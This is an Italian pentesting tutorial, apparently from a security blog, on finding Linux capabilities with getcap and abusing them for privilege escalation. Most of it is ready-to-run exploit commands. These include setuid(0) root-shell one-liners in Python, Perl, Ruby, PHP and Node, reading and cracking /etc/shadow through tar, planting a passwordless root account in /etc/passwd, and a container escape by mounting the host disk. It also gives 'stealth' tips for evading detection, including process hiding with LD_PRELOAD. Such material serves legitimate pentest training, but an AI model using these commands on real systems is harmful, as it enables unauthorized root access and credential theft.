---
title: 'Getcap: Enumerazione Linux Capabilities per Privilege Escalation'
slug: getcap
description: >-
  Getcap permette di individuare file con Linux capabilities per identificare
  vettori di privilege escalation senza SUID. Tecnica chiave in
  post-exploitation.
image: /Gemini_Generated_Image_3d33a03d33a03d33.webp
draft: false
date: 2026-02-13T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - linux-capabilities
---

Getcap è un tool nativo Linux che enumera le **capabilities** assegnate ai file eseguibili. Le capabilities sono il meccanismo moderno di Linux per dare privilegi granulari ai processi senza dover usare SUID root tradizionale. Invece di "tutto o niente" (root o user), le capabilities permettono di dare solo specifici poteri come "cambio UID", "bind su porte \<1024", o "lettura file protetti".

Quando fai privilege escalation su sistemi Linux moderni (Ubuntu 20+, Debian 11+, RHEL 8+), le capabilities sono spesso la chiave. Molti amministratori stanno sostituendo SUID binaries con capabilities-based security, credendo sia più sicuro. Ma capabilities mal configurate sono exploitable quanto SUID.

Getcap ti mostra quali binary hanno capabilities, e `capsh` ti mostra quali capabilities ha il tuo processo corrente. Combinati, ti permettono di identificare privilege escalation paths che enumeration tools classici (LinEnum, LinPEAS) potrebbero perdere o non evidenziare correttamente.

In questo articolo imparerai come usare getcap per enumeration completa, quali capabilities sono exploitable, come sfruttarle per privilege escalation, e come integrarle nel tuo pentest workflow. Vedrai esempi pratici di exploitation via capabilities su Python, Perl, e altri binary comuni.

***

## 1️⃣ Cosa Sono le Linux Capabilities

### Capabilities comuni exploitable

| **Capability**             | **Permette**                  | **Exploitation**                          |
| -------------------------- | ----------------------------- | ----------------------------------------- |
| **CAP\_SETUID**            | Cambiare UID arbitrariamente  | `os.setuid(0)` → root                     |
| **CAP\_DAC\_OVERRIDE**     | Bypass file permission checks | Leggere/scrivere qualsiasi file           |
| **CAP\_DAC\_READ\_SEARCH** | Bypass read permission        | Leggere /etc/shadow, chiavi SSH           |
| **CAP\_SYS\_ADMIN**        | Operazioni admin (mount, etc) | Container escape, filesystem manipulation |
| **CAP\_NET\_RAW**          | Raw socket access             | Network sniffing, packet injection        |
| **CAP\_CHOWN**             | Cambiare ownership file       | `chown root:root` su binary, poi SUID     |

🎓 **Nota:** Capability con `+ep` (effective + permitted) è immediatamente exploitable. Con `+ip` (inherited + permitted) richiede condizioni specifiche.

***

## 2️⃣ Uso Base di Getcap

### Enumeration completa filesystem

```bash
# Scan tutto il filesystem
getcap -r / 2>/dev/null
```

**Output esempio:**

```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

**Interpretazione:**

* `cap_net_raw` su ping/mtr = Expected (network tools)
* `cap_setuid` su python = **RED FLAG!** Exploitable per root

***

### Verifica capability di processo corrente

```bash
# Mostra capabilities del tuo processo
capsh --print
```

**Output:**

```
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,[...]
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=1000(user)
gid=1000(user)
groups=1000(user)
```

**Current: =** significa nessuna capability attiva. Se avessi `cap_setuid+ep`, saresti exploitable.

***

## 3️⃣ Exploitation Capabilities Comuni

### CAP\_SETUID - Privilege escalation diretta

**Scenario:** Python con `cap_setuid+ep`

```bash
# Enumeration
getcap -r / 2>/dev/null | grep setuid
# /usr/bin/python3.8 = cap_setuid+ep

# Exploitation
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root@target:~#
```

**Timeline:** 30 secondi

**Altri binary con CAP\_SETUID:**

```bash
# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# PHP
php -r 'posix_setuid(0); system("/bin/bash");'
```

***

### CAP\_DAC\_READ\_SEARCH - Lettura file protetti

**Scenario:** tar con capability read bypass

```bash
# Enumeration
getcap -r / 2>/dev/null | grep dac_read_search
# /usr/bin/tar = cap_dac_read_search+ep

# Exploitation - Leggi /etc/shadow
tar -czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null
cd /tmp
tar -xzf shadow.tar.gz
cat etc/shadow
# root:$6$hash...:18000:0:99999:7:::
```

**Cracka hash offline:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
# Cracked: root:password123
```

***

### CAP\_SYS\_ADMIN - Container escape

**Scenario:** Container con binary CAP\_SYS\_ADMIN

```bash
# In container
getcap -r / 2>/dev/null | grep sys_admin
# /usr/bin/custom-tool = cap_sys_admin+ep

# Exploitation - Mount host filesystem
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs /bin/bash
# root@host:/#
```

Per approfondire container escape techniques avanzate, consulta [strategie di escape da Docker e Kubernetes](https://hackita.it/articoli/container-escape).

***

## 4️⃣ Scenari Pratici

### Scenario A: Python cap\_setuid in CTF

**Contesto:** CTF machine, user `player`.

```bash
player@box:~$ getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep

player@box:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@box:~# cat /root/root.txt
```

**Timeline:** 1 minuto

***

### Scenario B: Enterprise - vim cap\_dac\_override

**Contesto:** Server con vim che ha DAC override capability.

```bash
# Enumeration
getcap -r /usr 2>/dev/null | grep dac_override
# /usr/bin/vim = cap_dac_override+ep

# Exploitation - Modifica /etc/passwd
/usr/bin/vim /etc/passwd
# In vim, aggiungi:
# hacker::0:0:root:/root:/bin/bash

su hacker
# root shell senza password
```

***

### Scenario C: Node.js capability exploitation

**Contesto:** Application server con Node.js capabilities.

```bash
getcap -r / 2>/dev/null
# /usr/bin/node = cap_setuid+ep

# Exploitation
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: "inherit"})'
# root shell
```

***

## 5️⃣ Integrazione Toolchain

### Getcap + GTFOBins

**Workflow:**

```bash
# 1. Getcap enumeration
getcap -r / 2>/dev/null > caps.txt

# 2. Identifica binary
cat caps.txt | grep setuid
# /usr/bin/python3.8 = cap_setuid+ep

# 3. GTFOBins lookup
# https://gtfobins.github.io/gtfobins/python/
# Categoria: Capabilities
```

Se vuoi approfondire l'uso di GTFOBins per exploitation completa, leggi [come sfruttare GTFOBins per privilege escalation su Linux](https://hackita.it/articoli/gtfobins).

***

### Getcap + [LinPEAS](https://hackita.it/linpeas)

```bash
# LinPEAS include getcap check
./linpeas.sh | grep -A10 "Capabilities"

# Ma Getcap dà output più pulito e focused
getcap -r / 2>/dev/null
```

***

## 6️⃣ Detection & Evasion

### Cosa monitora Blue Team

**Capability assignment logging:**

```bash
# auditd rule
-w /usr/bin/setcap -p x -k capability_set
```

**Exploitation detection:**

```bash
# EDR cerca:
# - setuid(0) syscall da processo non-root
# - Capability usage anomalo (Python calling setuid)
```

***

### Stealth tips

```bash
# Esegui con nice (lower priority)
nice -n 19 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Process hiding (LD_PRELOAD)
LD_PRELOAD=./hide.so /usr/bin/python3.8 [...]
```

***

## 7️⃣ Tabelle Reference

### Capabilities Exploitable Quick Reference

| **Capability**             | **Binary Comune**  | **Exploitation Command**                                      |
| -------------------------- | ------------------ | ------------------------------------------------------------- |
| **CAP\_SETUID**            | python, perl, ruby | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| **CAP\_DAC\_READ\_SEARCH** | tar, vim           | `tar czf /tmp/s.tar.gz /etc/shadow`                           |
| **CAP\_DAC\_OVERRIDE**     | vim, nano          | Edit `/etc/passwd` direttamente                               |
| **CAP\_SYS\_ADMIN**        | mount, custom      | `mount /dev/sda1 /mnt; chroot /mnt`                           |
| **CAP\_CHOWN**             | python, perl       | `chown root:root binary; chmod u+s binary`                    |

***

## 8️⃣ Troubleshooting

### Getcap non trova nulla

**Causa:** Filesystem montato senza extended attributes support.

**Fix:**

```bash
# Verifica extended attributes
tune2fs -l /dev/sda1 | grep features
# Deve avere "xattr"

# Remount con xattr
mount -o remount,user_xattr /
```

***

### Exploitation fallisce nonostante capability

**Causa:** Securebits o AppArmor/SELinux limitano capability usage.

**Fix:**

```bash
# Check securebits
capsh --print | grep Securebits

# Check AppArmor
aa-status

# Se AppArmor attivo, bypass difficile
```

***

## 9️⃣ FAQ

**Q: Capabilities sono più sicure di SUID?**

A: Teoricamente sì (granularità fine). Praticamente, **mal configurate sono identicamente exploitable**. `cap_setuid+ep` = SUID root in termini di exploitation.

**Q: Tutti i sistemi Linux hanno capabilities?**

A: Kernel 2.6.24+ (2008). Quindi sì, 99% dei sistemi. Sistemi embedded molto vecchi potrebbero non averle.

**Q: Getcap funziona in container?**

A: Sì, vedi capabilities del container. Per vedere host capabilities, devi escape first.

***

## 10️⃣ Cheat Sheet

| **Task**                      | **Command**                                                   |
| ----------------------------- | ------------------------------------------------------------- |
| **Enumeration completa**      | `getcap -r / 2>/dev/null`                                     |
| **Check directory specifica** | `getcap -r /usr/bin 2>/dev/null`                              |
| **Capabilities processo**     | `capsh --print`                                               |
| **Python CAP\_SETUID**        | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| **Perl CAP\_SETUID**          | `perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'`     |
| **Check specific file**       | `getcap /usr/bin/python3.8`                                   |

***

## Disclaimer

Getcap è tool nativo Linux per system administration. L'uso per privilege escalation senza autorizzazione è illegale. Usa solo in:

* Lab personali
* CTF autorizzati
* Pentest con contratto firmato

**Man page:** `man getcap` / `man capabilities`

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
